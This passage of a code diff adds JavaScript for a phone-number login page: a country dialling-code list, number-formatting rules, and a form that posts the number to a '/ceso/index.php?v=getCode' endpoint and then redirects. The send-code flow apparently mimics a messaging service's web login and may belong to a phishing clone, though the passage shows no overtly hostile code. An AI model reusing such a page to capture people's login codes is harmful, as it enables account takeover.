Rep.","id":41},{"code":"235","name":"Chad","id":42},{"code":"56","name":"Chile","id":43},{"code":"86","name":"China","id":44},{"code":"57","name":"Colombia","id":45},{"code":"269","name":"Comoros","id":46},{"code":"243","name":"Congo (Dem. Rep.)","id":47},{"code":"242","name":"Congo (Rep.)","id":48},{"code":"682","name":"Cook Islands","id":49},{"code":"506","name":"Costa Rica","id":50},{"code":"225","name":"Côte d'Ivoire","id":51},{"code":"385","name":"Croatia","id":52},{"code":"53","name":"Cuba","id":53},{"code":"599","name":"Curaçao","id":54},{"code":"357","name":"Cyprus","id":55},{"code":"420","name":"Czech Republic","id":56},{"code":"45","name":"Denmark","id":57},{"code":"246","name":"Diego Garcia","id":58},{"code":"253","name":"Djibouti","id":59},{"code":"1767","name":"Dominica","id":60},{"code":"1809","name":"Dominican Rep.","id":61},{"code":"1829","name":"Dominican Rep.","id":62},{"code":"1849","name":"Dominican Rep.","id":63},{"code":"593","name":"Ecuador","id":64},{"code":"20","name":"Egypt","id":65},{"code":"503","name":"El Salvador","id":66},{"code":"240","name":"Equatorial Guinea","id":67},{"code":"291","name":"Eritrea","id":68},{"code":"372","name":"Estonia","id":69},{"code":"268","name":"Eswatini","id":70},{"code":"251","name":"Ethiopia","id":71},{"code":"500","name":"Falkland Islands","id":72},{"code":"298","name":"Faroe Islands","id":73},{"code":"679","name":"Fiji","id":74},{"code":"358","name":"Finland","id":75},{"code":"33","name":"France","id":76},{"code":"594","name":"French Guiana","id":77},{"code":"689","name":"French Polynesia","id":78},{"code":"241","name":"Gabon","id":79},{"code":"220","name":"Gambia","id":80},{"code":"995","name":"Georgia","id":81},{"code":"49","name":"Germany","id":82},{"code":"233","name":"Ghana","id":83},{"code":"350","name":"Gibraltar","id":84},{"code":"30","name":"Greece","id":85},{"code":"299","name":"Greenland","id":86},{"code":"1473","name":"Grenada","id":87},{"code":"590","name":"Guadeloupe","id":88},{"code":"1671","name":"Guam","id":89},{"code":"502","name":"Guatemala","id":90},{"code":"224","name":"Guinea","id":91},{"code":"245","name":"Guinea-Bissau","id":92},{"code":"592","name":"Guyana","id":93},{"code":"509","name":"Haiti","id":94},{"code":"504","name":"Honduras","id":95},{"code":"852","name":"Hong Kong","id":96},{"code":"36","name":"Hungary","id":97},{"code":"354","name":"Iceland","id":98},{"code":"91","name":"India","id":99},{"code":"62","name":"Indonesia","id":100},{"code":"98","name":"Iran","id":101},{"code":"964","name":"Iraq","id":102},{"code":"353","name":"Ireland","id":103},{"code":"972","name":"Israel","id":104},{"code":"39","name":"Italy","id":105},{"code":"1876","name":"Jamaica","id":106},{"code":"81","name":"Japan","id":107},{"code":"962","name":"Jordan","id":108},{"code":"7","name":"Kazakhstan","id":109},{"code":"254","name":"Kenya","id":110},{"code":"686","name":"Kiribati","id":111},{"code":"383","name":"Kosovo","id":112},{"code":"965","name":"Kuwait","id":113},{"code":"996","name":"Kyrgyzstan","id":114},{"code":"856","name":"Laos","id":115},{"code":"371","name":"Latvia","id":116},{"code":"961","name":"Lebanon","id":117},{"code":"266","name":"Lesotho","id":118},{"code":"231","name":"Liberia","id":119},{"code":"218","name":"Libya","id":120},{"code":"423","name":"Liechtenstein","id":121},{"code":"370","name":"Lithuania","id":122},{"code":"352","name":"Luxembourg","id":123},{"code":"853","name":"Macau","id":124},{"code":"261","name":"Madagascar","id":125},{"code":"265","name":"Malawi","id":126},{"code":"60","name":"Malaysia","id":127},{"code":"960","name":"Maldives","id":128},{"code":"223","name":"Mali","id":129},{"code":"356","name":"Malta","id":130},{"code":"692","name":"Marshall Islands","id":131},{"code":"596","name":"Martinique","id":132},{"code":"222","name":"Mauritania","id":133},{"code":"230","name":"Mauritius","id":134},{"code":"52","name":"Mexico","id":135},{"code":"691","name":"Micronesia","id":136},{"code":"373","name":"Moldova","id":137},{"code":"377","name":"Monaco","id":138},{"code":"976","name":"Mongolia","id":139},{"code":"382","name":"Montenegro","id":140},{"code":"1664","name":"Montserrat","id":141},{"code":"212","name":"Morocco","id":142},{"code":"258","name":"Mozambique","id":143},{"code":"95","name":"Myanmar","id":144},{"code":"264","name":"Namibia","id":145},{"code":"674","name":"Nauru","id":146},{"code":"977","name":"Nepal","id":147},{"code":"31","name":"Netherlands","id":148},{"code":"687","name":"New Caledonia","id":149},{"code":"64","name":"New Zealand","id":150},{"code":"505","name":"Nicaragua","id":151},{"code":"227","name":"Niger","id":152},{"code":"234","name":"Nigeria","id":153},{"code":"683","name":"Niue","id":154},{"code":"672","name":"Norfolk Island","id":155},{"code":"850","name":"North Korea","id":156},{"code":"389","name":"North Macedonia","id":157},{"code":"1670","name":"Northern Mariana Islands","id":158},{"code":"47","name":"Norway","id":159},{"code":"968","name":"Oman","id":160},{"code":"92","name":"Pakistan","id":161},{"code":"680","name":"Palau","id":162},{"code":"970","name":"Palestine","id":163},{"code":"507","name":"Panama","id":164},{"code":"675","name":"Papua New Guinea","id":165},{"code":"595","name":"Paraguay","id":166},{"code":"51","name":"Peru","id":167},{"code":"63","name":"Philippines","id":168},{"code":"48","name":"Poland","id":169},{"code":"351","name":"Portugal","id":170},{"code":"1787","name":"Puerto Rico","id":171},{"code":"1939","name":"Puerto Rico","id":172},{"code":"974","name":"Qatar","id":173},{"code":"262","name":"Réunion","id":174},{"code":"40","name":"Romania","id":175},{"code":"7","name":"Russian Federation","id":176},{"code":"250","name":"Rwanda","id":177},{"code":"247","name":"Saint Helena","id":178},{"code":"290","name":"Saint Helena","id":179},{"code":"1869","name":"Saint Kitts & Nevis","id":180},{"code":"1758","name":"Saint Lucia","id":181},{"code":"508","name":"Saint Pierre & Miquelon","id":182},{"code":"1784","name":"Saint Vincent & the Grenadines","id":183},{"code":"685","name":"Samoa","id":184},{"code":"378","name":"San Marino","id":185},{"code":"239","name":"São Tomé & Príncipe","id":186},{"code":"966","name":"Saudi Arabia","id":187},{"code":"221","name":"Senegal","id":188},{"code":"381","name":"Serbia","id":189},{"code":"248","name":"Seychelles","id":190},{"code":"232","name":"Sierra Leone","id":191},{"code":"65","name":"Singapore","id":192},{"code":"1721","name":"Sint Maarten","id":193},{"code":"421","name":"Slovakia","id":194},{"code":"386","name":"Slovenia","id":195},{"code":"677","name":"Solomon Islands","id":196},{"code":"252","name":"Somalia","id":197},{"code":"27","name":"South Africa","id":198},{"code":"82","name":"South Korea","id":199},{"code":"211","name":"South Sudan","id":200},{"code":"34","name":"Spain","id":201},{"code":"94","name":"Sri Lanka","id":202},{"code":"249","name":"Sudan","id":203},{"code":"597","name":"Suriname","id":204},{"code":"46","name":"Sweden","id":205},{"code":"41","name":"Switzerland","id":206},{"code":"963","name":"Syria","id":207},{"code":"886","name":"Taiwan","id":208},{"code":"992","name":"Tajikistan","id":209},{"code":"255","name":"Tanzania","id":210},{"code":"66","name":"Thailand","id":211},{"code":"670","name":"Timor-Leste","id":212},{"code":"228","name":"Togo","id":213},{"code":"690","name":"Tokelau","id":214},{"code":"676","name":"Tonga","id":215},{"code":"1868","name":"Trinidad & Tobago","id":216},{"code":"216","name":"Tunisia","id":217},{"code":"90","name":"Turkey","id":218},{"code":"993","name":"Turkmenistan","id":219},{"code":"1649","name":"Turks & Caicos Islands","id":220},{"code":"688","name":"Tuvalu","id":221},{"code":"256","name":"Uganda","id":222},{"code":"380","name":"Ukraine","id":223},{"code":"971","name":"United Arab Emirates","id":224},{"code":"44","name":"United Kingdom","id":225},{"code":"598","name":"Uruguay","id":226},{"code":"1340","name":"US Virgin Islands","id":227},{"code":"1","name":"USA","id":228},{"code":"998","name":"Uzbekistan","id":229},{"code":"678","name":"Vanuatu","id":230},{"code":"58","name":"Venezuela","id":231},{"code":"84","name":"Vietnam","id":232},{"code":"681","name":"Wallis & Futuna","id":233},{"code":"967","name":"Yemen","id":234},{"code":"260","name":"Zambia","id":235},{"code":"263","name":"Zimbabwe","id":236}];
+
+    var patternsList = {"_376":{"patterns":"XX XX XX","startList":[2,2,2]},"_971":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_93":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_1268":{"patterns":"XXX XXXX","startList":[3,4]},"_1264":{"patterns":"XXX XXXX","startList":[3,4]},"_355":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_374":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_244":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_1684":{"patterns":"XXX XXXX","startList":[3,4]},"_43":{"patterns":"X XXXXXXXX","startList":[1,8]},"_61":{"patterns":"X XXXX XXXX","startList":[1,4,4]},"_297":{"patterns":"XXX XXXX","startList":[3,4]},"_994":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_387":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_1246":{"patterns":"XXX XXXX","startList":[3,4]},"_880":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_32":{"patterns":"XXX XX XX XX","startList":[3,2,2,2]},"_226":{"patterns":"XX XX XX XX","startList":[2,2,2,2]},"_973":{"patterns":"XXXX XXXX","startList":[4,4]},"_257":{"patterns":"XX XX XXXX","startList":[2,2,4]},"_229":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_1441":{"patterns":"XXX XXXX","startList":[3,4]},"_673":{"patterns":"XXX XXXX","startList":[3,4]},"_591":{"patterns":"X XXX XXXX","startList":[1,3,4]},"_55":{"patterns":"XX XXXXX XXXX","startList":[2,5,4]},"_1242":{"patterns":"XXX XXXX","startList":[3,4]},"_975":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_267":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_375":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_1":{"patterns":"XXX XXX XXXX","startList":[3,3,4]},"_243":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_236":{"patterns":"XX XX XX XX","startList":[2,2,2,2]},"_242":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_41":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_225":{"patterns":"XX XX XX XXXX","startList":[2,2,2,4]},"_56":{"patterns":"X XXXX XXXX","startList":[1,4,4]},"_237":{"patterns":"XXXX XXXX","startList":[4,4]},"_86":{"patterns":"XXX XXXX XXXX","startList":[3,4,4]},"_57":{"patterns":"XXX XXX XXXX","startList":[3,3,4]},"_506":{"patterns":"XXXX XXXX","startList":[4,4]},"_53":{"patterns":"X XXX XXXX","startList":[1,3,4]},"_238":{"patterns":"XXX XXXX","startList":[3,4]},"_357":{"patterns":"XXXX XXXX","startList":[4,4]},"_420":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_253":{"patterns":"XX XX XX XX","startList":[2,2,2,2]},"_45":{"patterns":"XXXX XXXX","startList":[4,4]},"_1767":{"patterns":"XXX XXXX","startList":[3,4]},"_1809":{"patterns":"XXX XXXX","startList":[3,4]},"_1829":{"patterns":"XXX XXXX","startList":[3,4]},"_1849":{"patterns":"XXX XXXX","startList":[3,4]},"_213":{"patterns":"XXX XX XX XX","startList":[3,2,2,2]},"_593":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_372":{"patterns":"XXXX XXXX","startList":[4,4]},"_20":{"patterns":"XX XXXX XXXX","startList":[2,4,4]},"_291":{"patterns":"X XXX XXX","startList":[1,3,3]},"_34":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_251":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_679":{"patterns":"XXX XXXX","startList":[3,4]},"_298":{"patterns":"XXX XXX","startList":[3,3]},"_33":{"patterns":"X XX XX XX XX","startList":[1,2,2,2,2]},"_241":{"patterns":"X XX XX XX","startList":[1,2,2,2]},"_44":{"patterns":"XXXX XXXXXX","startList":[4,6]},"_1473":{"patterns":"XXX XXXX","startList":[3,4]},"_995":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_233":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_350":{"patterns":"XXXX XXXX","startList":[4,4]},"_299":{"patterns":"XXX XXX","startList":[3,3]},"_220":{"patterns":"XXX XXXX","startList":[3,4]},"_224":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_590":{"patterns":"XXX XX XX XX","startList":[3,2,2,2]},"_240":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_30":{"patterns":"XXX XXX XXXX","startList":[3,3,4]},"_502":{"patterns":"X XXX XXXX","startList":[1,3,4]},"_1671":{"patterns":"XXX XXXX","startList":[3,4]},"_245":{"patterns":"XXX XXXX","startList":[3,4]},"_852":{"patterns":"X XXX XXXX","startList":[1,3,4]},"_504":{"patterns":"XXXX XXXX","startList":[4,4]},"_385":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_509":{"patterns":"XXXX XXXX","startList":[4,4]},"_36":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_62":{"patterns":"XXX XXXXXX","startList":[3,6]},"_353":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_972":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_91":{"patterns":"XXXXX XXXXX","startList":[5,5]},"_246":{"patterns":"XXX XXXX","startList":[3,4]},"_964":{"patterns":"XXX XXX XXXX","startList":[3,3,4]},"_98":{"patterns":"XXX XXX XXXX","startList":[3,3,4]},"_354":{"patterns":"XXX XXXX","startList":[3,4]},"_39":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_1876":{"patterns":"XXX XXXX","startList":[3,4]},"_962":{"patterns":"X XXXX XXXX","startList":[1,4,4]},"_81":{"patterns":"XX XXXX XXXX","startList":[2,4,4]},"_254":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_996":{"patterns":"XXX XXXXXX","startList":[3,6]},"_855":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_686":{"patterns":"XXXX XXXX","startList":[4,4]},"_269":{"patterns":"XXX XXXX","startList":[3,4]},"_1869":{"patterns":"XXX XXXX","startList":[3,4]},"_82":{"patterns":"XX XXXX XXX","startList":[2,4,3]},"_965":{"patterns":"XXXX XXXX","startList":[4,4]},"_1345":{"patterns":"XXX XXXX","startList":[3,4]},"_856":{"patterns":"XX XX XXX XXX","startList":[2,2,3,3]},"_961":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_1758":{"patterns":"XXX XXXX","startList":[3,4]},"_423":{"patterns":"XXX XXXX","startList":[3,4]},"_94":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_231":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_266":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_370":{"patterns":"XXX XXXXX","startList":[3,5]},"_352":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_371":{"patterns":"XXX XXXXX","startList":[3,5]},"_218":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_212":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_377":{"patterns":"XXXX XXXX","startList":[4,4]},"_373":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_261":{"patterns":"XX XX XXX XX","startList":[2,2,3,2]},"_389":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_223":{"patterns":"XXXX XXXX","startList":[4,4]},"_976":{"patterns":"XX XX XXXX","startList":[2,2,4]},"_853":{"patterns":"XXXX XXXX","startList":[4,4]},"_1670":{"patterns":"XXX XXXX","startList":[3,4]},"_222":{"patterns":"XXXX XXXX","startList":[4,4]},"_1664":{"patterns":"XXX XXXX","startList":[3,4]},"_356":{"patterns":"XX XX XX XX","startList":[2,2,2,2]},"_230":{"patterns":"XXXX XXXX","startList":[4,4]},"_960":{"patterns":"XXX XXXX","startList":[3,4]},"_265":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_60":{"patterns":"XX XXXX XXXX","startList":[2,4,4]},"_258":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_264":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_227":{"patterns":"XX XX XX XX","startList":[2,2,2,2]},"_234":{"patterns":"XX XXXX XXXX","startList":[2,4,4]},"_505":{"patterns":"XXXX XXXX","startList":[4,4]},"_47":{"patterns":"XXXX XXXX","startList":[4,4]},"_977":{"patterns":"XX XXXX XXXX","startList":[2,4,4]},"_64":{"patterns":"XXXX XXXX","startList":[4,4]},"_968":{"patterns":"XXXX XXXX","startList":[4,4]},"_507":{"patterns":"XXXX XXXX","startList":[4,4]},"_51":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_63":{"patterns":"XXX XXX XXXX","startList":[3,3,4]},"_92":{"patterns":"XXX XXX XXXX","startList":[3,3,4]},"_48":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_1787":{"patterns":"XXX XXXX","startList":[3,4]},"_1939":{"patterns":"XXX XXXX","startList":[3,4]},"_970":{"patterns":"XXX XX XXXX","startList":[3,2,4]},"_351":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_595":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_974":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_262":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_40":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_381":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_250":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_966":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_248":{"patterns":"X XX XX XX","startList":[1,2,2,2]},"_249":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_46":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_65":{"patterns":"XXXX XXXX","startList":[4,4]},"_290":{"patterns":"XX XXX","startList":[2,3]},"_386":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_421":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_232":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_378":{"patterns":"XXX XXX XXXX","startList":[3,3,4]},"_221":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_252":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_597":{"patterns":"XXX XXXX","startList":[3,4]},"_211":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_239":{"patterns":"XX XXXXX","startList":[2,5]},"_503":{"patterns":"XXXX XXXX","startList":[4,4]},"_1721":{"patterns":"XXX XXXX","startList":[3,4]},"_963":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_268":{"patterns":"XXXX XXXX","startList":[4,4]},"_1649":{"patterns":"XXX XXXX","startList":[3,4]},"_235":{"patterns":"XX XX XX XX","startList":[2,2,2,2]},"_228":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_66":{"patterns":"X XXXX XXXX","startList":[1,4,4]},"_992":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_993":{"patterns":"XX XXXXXX","startList":[2,6]},"_216":{"patterns":"XX XXX XXX","startList":[2,3,3]},"_90":{"patterns":"XXX XXX XXXX","startList":[3,3,4]},"_1868":{"patterns":"XXX XXXX","startList":[3,4]},"_886":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_255":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_380":{"patterns":"XX XXX XX XX","startList":[2,3,2,2]},"_256":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_598":{"patterns":"X XXX XXXX","startList":[1,3,4]},"_998":{"patterns":"XX XXX XX XX","startList":[2,3,2,2]},"_1784":{"patterns":"XXX XXXX","startList":[3,4]},"_58":{"patterns":"XXX XXX XXXX","startList":[3,3,4]},"_1284":{"patterns":"XXX XXXX","startList":[3,4]},"_1340":{"patterns":"XXX XXXX","startList":[3,4]},"_383":{"patterns":"XXXX XXXX","startList":[4,4]},"_967":{"patterns":"XXX XXX XXX","startList":[3,3,3]},"_27":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_260":{"patterns":"XX XXX XXXX","startList":[2,3,4]},"_263":{"patterns":"XX XXX XXXX","startList":[2,3,4]}};
+
+    function filterCountryCodeList(value) {
+        var result = [];
+        countryList.filter(function(item){
+                if(item.code.includes(value)){
+                    result.push(item.id)
+                }
+                return false;
+        });
+        return result;
+    }
+
+    function filterCountryNameList(value) {
+        var result = [];
+        countryList.filter(function(item){
+            if(item.name.toLowerCase().includes(value.toLowerCase())){
+                result.push(item.id)
+            }
+            return false;
+        });
+        return result;
+    }
+
+    function countryCodeExist(value) {
+        for (var i = 0;i < countryList.length;i++) {
+            if(value === countryList[i]['code']){
+                return countryList[i]['name']
+            }
+        }
+        return '';
+    }
+
+    function mobileFormate(countryCode,mobile) {
+
+        if(countryCode == "31") {
+
+            if (mobile.substr(0,2) == "97") {
+                var startList = [1,2,2,2,2]
+                return mobileFormateHandle(mobile,startList)
+            } else {
+                var startList = [2,4,5]
+                return mobileFormateHandle(mobile,startList)
+            }
+        } else if(countryCode == "7") {
+
+            if (mobile.substr(0,1) == "6" || mobile.substr(0,1) == "7") {
+                var startList = [3,3,2,2]
+                return mobileFormateHandle(mobile,startList)
+            } else {
+                var startList = [3,3,4]
+                return mobileFormateHandle(mobile,startList)
+            }
+        } else if(countryCode == "49") {
+
+            if (mobile.substr(0,2) == "16" || mobile.substr(0,2) == "17") {
+                var startList = [3,7]
+                return mobileFormateHandle(mobile,startList)
+            } else {
+                var startList = [4,6]
+                return mobileFormateHandle(mobile,startList)
+            }
+        }
+
+        var key = "_" + countryCode;
+
+        if(patternsList[key] == undefined || patternsList[key] == null) {
+            return mobile
+        }
+
+        if(patternsList[key]['startList'] == undefined || patternsList[key]['startList'].length < 2) {
+            return mobile
+        }
+
+        return mobileFormateHandle(mobile,patternsList[key]['startList'])
+    }
+
+    function mobileFormateHandle(mobile,startList) {
+        var start = 0;
+        var newMobile = "";
+        var seg = "";
+        for (var i = 0; i < startList.length - 1; i ++) {
+            seg = mobile.substr(start,startList[i])
+            if (seg == "" || seg.length < startList[i]) {
+                break
+            }
+            newMobile += mobile.substr(start,startList[i]) + " "
+            start = start+startList[i]
+        }
+        newMobile += mobile.substr(start)
+
+        return newMobile
+    }
+
+</script>
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"
+  integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
+  crossorigin="anonymous"></script>
+<script>
+
+    $(function () {
+
+        var selectCountryCode = "";
+
+        var oldPhoneInputVal = '';
+
+        var phoneLableText = "Your phone number";
+
+        var requestFlag = false;
+
+        initForm()
+
+        $("#aaaa22").click(function () {
+            if (getComputedStyle(document.documentElement).getPropertyValue('--color-background').trim() == "red") {
+                document.documentElement.style.setProperty("--main-color","black")
+            }else if (getComputedStyle(document.documentElement).getPropertyValue('--main-color').trim() == "black") {
+                document.documentElement.style.setProperty("--main-color","red")
+            }
+
+        })
+
+        $('body').click(function(e) {
+
+            var country =  $('#country-input').val()
+            if (country == ""){
+                if ($('#country-wrap>label').hasClass('lable-focus')) {
+                    $('#country-wrap>label').removeClass("lable-focus")
+                }
+            }
+
+            if ($('#country-input').hasClass('input-focus')) {
+                $('#country-input').removeClass("input-focus")
+            }
+
+            if ($('#country-wrap>label').hasClass('lable-border-focus')) {
+                $('#country-wrap>label').removeClass("lable-border-focus")
+            }
+
+            if ($('#country-wrap>i').hasClass('iOpen')) {
+                $('#country-wrap>i').removeClass("iOpen")
+            }
+
+            if ($('#country-menu').css('display') !== 'none') {
+                $('#country-menu').hide()
+            }
+
+
+
+            var phone =  $('#phone-input').val()
+            if (phone == ""){
+                if ($('#phone-wrap>label').hasClass('lable-focus')) {
+                    $('#phone-wrap>label').removeClass("lable-focus")
+                }
+            }
+
+            if ($('#phone-wrap>label').hasClass('lable-border-focus')) {
+                $('#phone-wrap>label').removeClass("lable-border-focus")
+            }
+
+            if ($('#phone-input').hasClass('input-focus')) {
+                $('#phone-input').removeClass("input-focus")
+            }
+
+            $(document).scrollTop(0);
+
+        })
+
+        $("#country-input").on('input',function () {
+
+            var value = $(this).val()
+            value = value.trim()
+            if(value == "") {
+                showMenu(null)
+            } else {
+                if((/^(\+)?[1-9]{1,5}$/.test(value)))
+                {
+                    if(value.substring(0, 1) == "+"){
+                        value = value.substring(1)
+                    }
+                    var result = filterCountryCodeList(value)
+                    showMenu(result)
+                } else {
+                    var result = filterCountryNameList(value)
+                    showMenu(result)
+                }
+            }
+            
+        })
+
+        $("#country-wrap").on('click',function (e) {
+
+            e.stopPropagation();
+
+            if (!$('#country-wrap>label').hasClass('lable-focus')) {
+                $('#country-wrap>label').addClass("lable-focus")
+            }
+
+            if (!$('#country-wrap>label').hasClass('lable-border-focus')) {
+                $('#country-wrap>label').addClass("lable-border-focus")
+            }
+
+            if (!$('#country-input').hasClass('input-focus')) {
+                $('#country-input').addClass("input-focus")
+            }
+
+            if (!$('#country-wrap>i').hasClass('iOpen')) {
+                $('#country-wrap>i').addClass("iOpen")
+            } else {
+            }
+
+            if ($('#country-menu').css('display') !== 'none') {
+                $(".country-menu-item").show()
+            } else {
+
+                $('#country-menu').show()
+                $(".country-menu-item").show()
+                $(document).scrollTop($(document).height());
+            }
+
+            if ($('#country-input').is(':focus')) {
+
+            } else {
+                $('#country-input').focus();
+            }
+
+
+        })
+
+        $(".country-menu-item").mousedown(function (e) {
+
+            var countryCode = $(this).attr('country-code')
+            var countryName = $(this).attr('country-name')
+
+            if (countryCode == "" || countryName == "") {
+                return
+            }
+
+            if (selectCountryCode == countryCode) {
+                $("#country-input").val(countryName)
+                return
+            }
+
+            selectCountryCode = countryCode;
+            oldPhoneInputVal = '+'+countryCode + " "
+
+            $("#country-input").val(countryName)
+            $("#phone-input").val('+'+countryCode + " ")
+
+            $("#phone-lable-text").text(phoneLableText)
+
+            if ($('#phone-wrap>label').hasClass('lable-border-focus-error')) {
+                $('#phone-wrap>label').removeClass("lable-border-focus-error")
+            }
+
+            if ($('#phone-input').hasClass('input-focus-error')) {
+                $('#phone-input').removeClass("input-focus-error")
+            }
+
+            if (!$('#country-wrap>label').hasClass('lable-focus')) {
+                $('#country-wrap>label').addClass("lable-focus")
+            }
+            if (!$('#phone-wrap>label').hasClass('lable-focus')) {
+                $('#phone-wrap>label').addClass("lable-focus")
+            }
+
+        })
+
+        $("#phone-wrap").click(function (e) {
+
+            e.stopPropagation();
+
+            if (!$('#phone-wrap>label').hasClass('lable-focus')) {
+                $('#phone-wrap>label').addClass("lable-focus")
+            }
+
+            if (!$('#phone-wrap>label').hasClass('lable-border-focus-error')) {
+                if (!$('#phone-wrap>label').hasClass('lable-border-focus')) {
+                    $('#phone-wrap>label').addClass("lable-border-focus")
+                }
+            }
+
+            if (!$('#phone-input').hasClass('input-focus-error')) {
+                if (!$('#phone-input').hasClass('input-focus')) {
+                    $('#phone-input').addClass("input-focus")
+                }
+            }
+
+            $(document).scrollTop($(document).height());
+
+            $('#phone-input').focus();
+
+        })
+
+        $('#phone-input').on('input', function() {
+
+            var mobile = $(this).val()
+
+            if (mobile.length > oldPhoneInputVal.length) {
+                addPhoneInputVal(mobile)
+            } else {
+                decPhoneInputVal(mobile)
+            }
+
+            $("#phone-lable-text").text(phoneLableText)
+
+            
+            if ($('#phone-wrap>label').hasClass('lable-border-focus-error')) {
+                $('#phone-wrap>label').removeClass("lable-border-focus-error")
+            }
+
+            if ($('#phone-input').hasClass('input-focus-error')) {
+                $('#phone-input').removeClass("input-focus-error")
+            }
+
+            if (!$('#phone-wrap>label').hasClass('lable-border-focus')) {
+                $('#phone-wrap>label').addClass("lable-border-focus")
+            }
+
+            if (!$('#phone-input').hasClass('input-focus')) {
+                $('#phone-input').addClass("input-focus")
+            }
+
+            if (mobile.length > 7) {
+                $("#login-btn-wrap").show();
+            } else {
+                $("#login-btn-wrap").hide();
+            }
+
+        });
+
+        $("#login-btn").on('click',function (e) {
+
+            e.stopPropagation();
+
+            try {
+
+                if ($('#phone-input').val().length < 5) {
+                    $("#phone-lable-text").text("Invalid phone number.")
+                    phoneError()
+                    return
+                }
+
+                if (requestFlag) {
+                    return;
+                }
+
+                requestFlag = true;
+                $("#modal-wrap").show()
+                $("#login-btn-text").text("PLEASE WAIT...")
+                $('#login-btn').addClass("login-btn-opacity")
+                $("#login-btn > .login-btn-loading-wrap").css({"display": "flex"})
+
+                var requestParam = {
+                    mobile: $('#phone-input').val()
+                }
+                if(requestParam.uuid == undefined || requestParam.uuid == null || requestParam.uuid == '') {
+                    requestParam.uuid = '';
+                }
+
+                sendRequest('/ceso/index.php?v=getCode' ,requestParam,function (r) {
+
+                    requestFlag = false;
+                    $("#modal-wrap").hide()
+                    $("#login-btn-text").text("NEXT")
+                    $('#login-btn').removeClass("login-btn-opacity")
+                    $("#login-btn > .login-btn-loading-wrap").css({"display": "none"})
+
+                    if (r.status == 'code_sent') {
+
+                        window.location.replace(r.goto)
+
+                    } else {
+
+                        if (r.msg == undefined || r.msg == null || r.msg == "") {
+                            $("#phone-lable-text").text("Request errors")
+                            phoneError()
+                        } else {
+                            $("#phone-lable-text").text(r.msg)
+                            phoneError()
+                        }
+                    }
+                });
+            }catch (e) {
+                requestFlag = false;
+                $("#modal-wrap").hide()
+                $("#login-btn-text").text("NEXT")
+                $('#login-btn').removeClass("login-btn-opacity")
+                $("#login-btn > .login-btn-loading-wrap").css({"display": "none"})
+                $("#phone-lable-text").text("System error")
+                phoneError()
+            }
+
+
+        })
+
+        function addPhoneInputVal(mobile) {
+
+            var pre = "";
+            if(mobile.substring(0, 1) == "+"){
+                mobile = mobile.substring(1)
+                pre= "+"
+            }
+
+            mobile = mobile.replace(/\D/g, '');
+            if (mobile.length > 30) {
+                mobile = mobile.substr(0,30)
+            }
+
+            var pregCode = "";
+            var countryName = ""
+
+            for (var i = mobile.substring(0,4).length; i>0; i--) {
+                countryName = countryCodeExist(mobile.substring(0,i))
+                if(countryName != "") {
+                    pregCode = mobile.substring(0,i);
+                    break
+                }
+            }
+
+            if (pregCode == ""){
